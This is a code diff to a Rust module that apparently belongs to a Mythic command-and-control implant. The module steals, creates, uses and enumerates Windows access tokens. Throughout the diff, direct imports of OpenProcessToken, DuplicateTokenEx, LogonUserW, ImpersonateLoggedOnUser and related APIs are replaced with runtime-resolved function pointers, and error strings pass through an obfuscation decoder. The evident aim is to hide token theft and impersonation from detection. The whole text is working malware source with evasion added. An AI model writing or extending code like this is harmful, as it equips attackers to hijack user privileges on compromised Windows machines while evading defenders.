@@ -5,16 +5,15 @@ use std::error::Error;
 use std::sync::Mutex;
 
 #[cfg(target_os = "windows")]
-use winapi::um::{
-    handleapi::CloseHandle,
-    processthreadsapi::{OpenProcess, OpenProcessToken},
-    securitybaseapi::{DuplicateTokenEx, ImpersonateLoggedOnUser, RevertToSelf},
-    winbase::{LogonUserW, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT},
-    winnt::{
-        SecurityImpersonation, TokenPrimary, HANDLE, MAXIMUM_ALLOWED,
-        PROCESS_QUERY_INFORMATION, TOKEN_DUPLICATE,
-    },
+use winapi::um::winnt::{
+    SecurityImpersonation, TokenPrimary, HANDLE, MAXIMUM_ALLOWED,
+    PROCESS_QUERY_INFORMATION, TOKEN_DUPLICATE,
 };
+
+#[cfg(target_os = "windows")]
+const LOGON32_LOGON_NEW_CREDENTIALS: u32 = 9;
+#[cfg(target_os = "windows")]
+const LOGON32_PROVIDER_DEFAULT: u32 = 0;
 
 #[derive(Serialize, Clone)]
 struct TokenEntry {
@@ -69,19 +68,43 @@ pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>
     let args: TokenStealArgs = serde_json::from_str(&task.parameters)?;
 
     unsafe {
-        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, args.pid);
+        // Type definitions for dynamically resolved functions
+        type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void;
+        type OpenProcessTokenFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut *mut std::ffi::c_void) -> i32;
+        type DuplicateTokenExFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut std::ffi::c_void, u32, u32, *mut *mut std::ffi::c_void) -> i32;
+        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+
+        // Dynamically resolve APIs
+        let open_process: OpenProcessFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "OpenProcess")
+                .ok_or_else(|| format!("{} OpenProcess", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_OPEN)))?
+        );
+        let open_process_token: OpenProcessTokenFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "OpenProcessToken")
+                .ok_or_else(|| format!("{} OpenProcessToken", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_TOKEN)))?
+        );
+        let duplicate_token_ex: DuplicateTokenExFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "DuplicateTokenEx")
+                .ok_or_else(|| format!("{} DuplicateTokenEx", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_DUP)))?
+        );
+        let close_handle: CloseHandleFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle")
+                .ok_or_else(|| "CloseHandle resolve failed".to_string())?
+        );
+
+        let process_handle = open_process(PROCESS_QUERY_INFORMATION, 0, args.pid);
         if process_handle.is_null() {
             return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_OPEN), args.pid)));
         }
 
         let mut token_handle: HANDLE = std::ptr::null_mut();
-        if OpenProcessToken(process_handle, TOKEN_DUPLICATE, &mut token_handle) == 0 {
-            CloseHandle(process_handle);
+        if open_process_token(process_handle, TOKEN_DUPLICATE, &mut token_handle) == 0 {
+            close_handle(process_handle);
             return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_TOKEN), args.pid)));
         }
 
         let mut duplicated_token: HANDLE = std::ptr::null_mut();
-        let result = DuplicateTokenEx(
+        let result = duplicate_token_ex(
             token_handle,
             MAXIMUM_ALLOWED,
             std::ptr::null_mut(),
@@ -90,8 +113,8 @@ pub fn token_steal(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>
             &mut duplicated_token,
         );
 
-        CloseHandle(token_handle);
-        CloseHandle(process_handle);
+        close_handle(token_handle);
+        close_handle(process_handle);
 
         if result == 0 {
             return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_DUP), args.pid)));
@@ -129,8 +152,17 @@ pub fn token_make(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>>
     let password: Vec<u16> = args.password.encode_utf16().chain(std::iter::once(0)).collect();
 
     unsafe {
+        // Type definition for dynamically resolved function
+        type LogonUserWFn = unsafe extern "system" fn(*const u16, *const u16, *const u16, u32, u32, *mut *mut std::ffi::c_void) -> i32;
+
+        // Dynamically resolve LogonUserW
+        let logon_user_w: LogonUserWFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "LogonUserW")
+                .ok_or_else(|| format!("{} LogonUserW", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_CREATE)))?
+        );
+
         let mut token_handle: HANDLE = std::ptr::null_mut();
-        let result = LogonUserW(
+        let result = logon_user_w(
             username.as_ptr(),
             domain.as_ptr(),
             password.as_ptr(),
@@ -180,7 +212,16 @@ pub fn token_use(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> 
             drop(store);
 
             unsafe {
-                if ImpersonateLoggedOnUser(handle) == 0 {
+                // Type definition for dynamically resolved function
+                type ImpersonateLoggedOnUserFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+
+                // Dynamically resolve ImpersonateLoggedOnUser
+                let impersonate_logged_on_user: ImpersonateLoggedOnUserFn = std::mem::transmute(
+                    crate::winapi_resolve::resolve("advapi32.dll", "ImpersonateLoggedOnUser")
+                        .ok_or_else(|| format!("{} ImpersonateLoggedOnUser", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_IMP)))?
+                );
+
+                if impersonate_logged_on_user(handle) == 0 {
                     return Ok(mythic_error!(task.id, format!("{} {}", crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_IMP), args.token_id)));
                 }
             }
@@ -199,7 +240,16 @@ pub fn token_use(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> 
 #[cfg(target_os = "windows")]
 pub fn token_revert(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
     unsafe {
-        if RevertToSelf() == 0 {
+        // Type definition for dynamically resolved function
+        type RevertToSelfFn = unsafe extern "system" fn() -> i32;
+
+        // Dynamically resolve RevertToSelf
+        let revert_to_self: RevertToSelfFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("advapi32.dll", "RevertToSelf")
+                .ok_or_else(|| crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_REVERT))?
+        );
+
+        if revert_to_self() == 0 {
             return Ok(mythic_error!(task.id, crate::obfstr::d(crate::obfstr::S_TOKEN_FAIL_REVERT)));
         }
     }
@@ -216,8 +266,15 @@ pub fn token_revert(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error
 pub fn clear_all_tokens() -> usize {
     let mut store = TOKEN_STORE.lock().unwrap();
     unsafe {
-        for entry in store.iter() {
-            CloseHandle(entry.handle as HANDLE);
+        // Type definition for dynamically resolved function
+        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+
+        // Dynamically resolve CloseHandle
+        if let Some(ptr) = crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle") {
+            let close_handle: CloseHandleFn = std::mem::transmute(ptr);
+            for entry in store.iter() {
+                close_handle(entry.handle as HANDLE);
+            }
         }
     }
     let count = store.len();
@@ -283,26 +340,48 @@ pub fn token_enum(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>>
 
 #[cfg(target_os = "windows")]
 unsafe fn get_process_user(pid: u32) -> String {
-    use winapi::um::winnt::TOKEN_QUERY;
-    use winapi::um::securitybaseapi::GetTokenInformation;
-    use winapi::um::winnt::{TokenUser, TOKEN_USER};
+    use winapi::um::winnt::{TokenUser, TOKEN_USER, TOKEN_QUERY};
 
-    let process = OpenProcess(0x0400, 0, pid); // PROCESS_QUERY_LIMITED_INFORMATION
+    // Type definitions for dynamically resolved functions
+    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void;
+    type OpenProcessTokenFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut *mut std::ffi::c_void) -> i32;
+    type GetTokenInformationFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut u8, u32, *mut u32) -> i32;
+    type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+
+    // Dynamically resolve APIs
+    let open_process: OpenProcessFn = match crate::winapi_resolve::resolve("kernel32.dll", "OpenProcess") {
+        Some(ptr) => std::mem::transmute(ptr),
+        None => return "(resolve failed)".to_string(),
+    };
+    let open_process_token: OpenProcessTokenFn = match crate::winapi_resolve::resolve("advapi32.dll", "OpenProcessToken") {
+        Some(ptr) => std::mem::transmute(ptr),
+        None => return "(resolve failed)".to_string(),
+    };
+    let get_token_information: GetTokenInformationFn = match crate::winapi_resolve::resolve("advapi32.dll", "GetTokenInformation") {
+        Some(ptr) => std::mem::transmute(ptr),
+        None => return "(resolve failed)".to_string(),
+    };
+    let close_handle: CloseHandleFn = match crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle") {
+        Some(ptr) => std::mem::transmute(ptr),
+        None => return "(resolve failed)".to_string(),
+    };
+
+    let process = open_process(0x0400, 0, pid); // PROCESS_QUERY_LIMITED_INFORMATION
     if process.is_null() {
         return "(access denied)".to_string();
     }
 
     let mut token: HANDLE = std::ptr::null_mut();
-    if OpenProcessToken(process, TOKEN_QUERY, &mut token) == 0 {
-        CloseHandle(process);
+    if open_process_token(process, TOKEN_QUERY, &mut token) == 0 {
+        close_handle(process);
         return "(no token)".to_string();
     }
 
     let mut buf = vec![0u8; 256];
     let mut len: u32 = 0;
-    if GetTokenInformation(token, TokenUser, buf.as_mut_ptr() as *mut _, buf.len() as u32, &mut len) == 0 {
-        CloseHandle(token);
-        CloseHandle(process);
+    if get_token_information(token, TokenUser, buf.as_mut_ptr() as *mut _, buf.len() as u32, &mut len) == 0 {
+        close_handle(token);
+        close_handle(process);
         return "(unknown)".to_string();
     }
 
@@ -311,8 +390,8 @@ unsafe fn get_process_user(pid: u32) -> String {
 
     let username = sid_to_username(sid);
 
-    CloseHandle(token);
-    CloseHandle(process);
+    close_handle(token);
+    close_handle(process);
     username
 }
 
